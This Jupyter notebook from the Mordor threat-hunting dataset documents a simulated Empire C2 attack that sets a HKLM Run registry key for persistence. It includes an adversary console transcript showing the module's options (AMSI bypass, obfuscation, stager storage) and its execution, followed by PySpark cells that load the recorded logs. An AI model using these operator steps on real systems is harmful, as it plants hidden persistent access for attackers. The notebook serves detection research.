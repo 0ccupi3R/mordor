{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Elevated Registry"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SDWIN-190518183936 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| Mordor shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_registry.zip |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries modifying HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry keys for persistence."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: 712ETU3B) > agents\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\\pgustavo        powershell         9076   5/0.0    2020-07-22 04:06:31  http            \n",
    "\n",
    "(Empire: agents) > \n",
    "(Empire: agents) > interact 712ETU3B\n",
    "(Empire: 712ETU3B) > \n",
    "(Empire: 712ETU3B) > usemodule persistence/elevated/registry*\n",
    "\n",
    "(Empire: 712ETU3B) > usemodule persistence/elevated/registry*\n",
    "(Empire: powershell/persistence/elevated/registry) > info\n",
    "\n",
    "              Name: Invoke-Registry\n",
    "            Module: powershell/persistence/elevated/registry\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) via the\n",
    "  HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry\n",
    "  key. This has an easy detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        712ETU3B                  Agent to run module on.                 \n",
    "  Listener         False                                 Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  KeyName          True        Updater                   Key name for the run trigger.           \n",
    "  RegPath          False       HKLM:SOFTWARE\\Microsoft\\  Registry location to store the script   \n",
    "                              Windows\\CurrentVersion\\D  code. Last element is the key name.     \n",
    "                              ebug                    \n",
    "  ADSPath          False                                 Alternate-data-stream location to store \n",
    "                                                        the script code.                        \n",
    "  ExtFile          False                                 Use an external file for the payload    \n",
    "                                                        instead of a stager.                    \n",
    "  Cleanup          False                                 Switch. Cleanup the trigger and any     \n",
    "                                                        script from specified location.         \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/persistence/elevated/registry) > set Listener http\n",
    "(Empire: powershell/persistence/elevated/registry) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked 712ETU3B to run TASK_CMD_WAIT\n",
    "[*] Agent 712ETU3B tasked with task ID 7\n",
    "[*] Tasked agent 712ETU3B to run module powershell/persistence/elevated/registry\n",
    "(Empire: powershell/persistence/elevated/registry) > \n",
    "Registry persistence established using listener http stored in HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug.\n",
    "\n",
    "(Empire: powershell/persistence/elevated/registry) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_registry.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT *\n",
    "FROM mordorTable\n",
    "    '''\n",
    ")\n",
    "df.printSchema()\n",
    "        "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}